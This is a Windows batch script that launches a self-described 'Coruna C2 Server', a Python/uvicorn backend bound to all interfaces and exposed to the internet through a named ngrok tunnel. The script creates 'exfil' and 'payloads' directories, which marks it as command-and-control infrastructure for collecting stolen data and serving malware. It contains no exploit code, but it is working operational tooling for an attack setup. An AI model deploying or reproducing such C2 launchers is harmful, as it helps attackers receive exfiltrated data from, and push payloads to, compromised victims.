@echo off
setlocal

set "PUBLIC_URL=https://snippet-stunt-backrest.ngrok-free.dev"
set "CORUNA_HOST=0.0.0.0"
set "CORUNA_PORT=8782"
set "CORUNA_SERVER_URL=%PUBLIC_URL%"
set "CORS_ORIGINS=%PUBLIC_URL%"

echo Starting Coruna C2 Server for %PUBLIC_URL%

python --version >nul 2>&1
if errorlevel 1 (
    echo Python is not installed or not in PATH.
    pause
    exit /b 1
)

cd /d "%~dp0backend"

if not exist "venv" (
    echo Creating virtual environment...
    python -m venv venv
)

call venv\Scripts\activate.bat

echo Installing dependencies...
pip install -r requirements.txt
if errorlevel 1 (
    echo Dependency installation failed.
    pause
    exit /b 1
)

if not exist "..\exfil" mkdir "..\exfil"
if not exist "..\log" mkdir "..\log"
if not exist "..\payloads" mkdir "..\payloads"

echo Local service: http://127.0.0.1:%CORUNA_PORT%
echo Public URL: %CORUNA_SERVER_URL%
echo.
echo If ngrok is not already running, forward it with:
echo ngrok http --domain=snippet-stunt-backrest.ngrok-free.dev %CORUNA_PORT%
echo.

uvicorn main:app --host %CORUNA_HOST% --port %CORUNA_PORT% --reload

pause
